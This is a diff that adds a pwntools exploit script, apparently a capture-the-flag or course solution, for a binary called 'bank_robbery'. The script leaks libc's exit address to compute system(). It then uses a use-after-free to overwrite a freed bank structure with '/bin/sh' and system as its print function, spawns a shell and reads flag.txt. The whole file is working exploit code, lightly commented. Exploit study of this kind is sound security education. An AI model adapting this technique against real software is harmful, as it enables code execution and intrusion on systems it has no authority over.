@@ -1,0 +1,118 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from time import sleep
+
+exe = context.binary = ELF("./bank_robbery", checksec=False)
+context.log_level = "error"
+
+
+def start(argv=[], *a, **kw):
+    gdbscript = """
+    tbreak main
+    continue
+    """.format(
+        **locals()
+    )
+
+    if args.GDB:
+        context.log_level = "debug"
+        context.terminal = ["/mnt/d/Programs/wsl-terminal/open-wsl.exe", "-e"]
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def _select_bank(slot):
+    io.recv().decode("utf-8")
+    io.sendline("1")
+    io.recv().decode("utf-8")
+    io.sendline(str(slot))
+    io.recv().decode("utf-8")
+
+def open_bank(slot, code=0, name='bank', accounts=[], panic=1, printer=1):
+    _select_bank(slot)
+    io.sendline("2")
+    io.recv().decode("utf-8")
+    io.sendline(str(code))
+    io.recv().decode("utf-8")
+    io.sendline(name)
+    io.recv().decode("utf-8")
+    io.sendline(str(len(accounts)))
+    for account in accounts:
+        io.recv().decode("utf-8")
+        io.sendline(str(account))
+    io.recv().decode("utf-8")
+    io.sendline(str(printer)) # basic
+    io.recv().decode("utf-8")
+    io.sendline(str(panic)) # dial
+
+def close_bank(slot):
+    _select_bank(slot)
+    io.sendline("4")
+
+def print_bank(slot):
+    _select_bank(slot)
+    io.sendline("3")
+
+def panic(slot):
+    _select_bank(slot)
+    resp = io.sendline("5")
+    return resp
+
+def main():
+    global io
+    io = start()
+
+    # so here we are...
+    # the approach will be to pass system as the print_header function to a bank, similar to how it worked in task 28.
+
+    # vuln is in main:61, a even after freeing the memory for a bank, the bank is still being accessed
+
+    # so we open a two banks. For ease we say slot 1 and slot 2.
+    open_bank(slot=1, name="12345678", code=1, panic=2)
+    open_bank(slot=2, name="filler", code=2)
+
+    # first, as always, lets grab some system ^^
+    # we set bank 1s name to 8 characters, to dodge the name will be nullterminated.
+    # we set the panic function to exit(), so we can grab the libc addr
+    print_bank(slot=1)
+    res = io.recvline()[36:-1]
+    res += b'\0' * (8-len(res))
+    exit_addr = struct.unpack("<Q", res)[0]
+    system_addr = exit_addr + 0xa900
+
+    # we close two both banks to free the allocated memory
+    close_bank(slot=2)
+    close_bank(slot=1)
+
+    # we open another bank (at the location of the first)
+    # now we use accounts to overwrite the field of bank two, 
+    # since that's where accounts are being allocated now :)
+    
+    # first, lets construct a payload we want to inject ONTO bank[2]
+    payload  = [0]                                  # blz, account_num
+    payload += [0x68732f6e69622f]                   # "/bin/sh" <- name
+    payload += [0]                                  # panic
+    payload += [0]                                  # accounts <- NULL
+    payload += [system_addr]                   # system <- print_header
+    payload += [0]                                  # 0 <- closed
+    
+    # first pad 0x20 bytes until bank[2] and then write payload
+    open_bank(slot=3, name="oof", code=3, accounts=(payload))
+
+    # now we just need to invoke print on bank 2 ...
+    print_bank(slot=2)
+
+    # ...print the flag...
+    sleep(0.5)    
+    io.sendline("cat flag.txt")
+    print(io.recvuntil("}").split()[-1].decode("utf-8"))
+
+    # ... and clean up :)
+    io.close()
+    
+    print("PABE was a joy, thank you guys <3")
+    
+
+if __name__ == "__main__":
+    main()
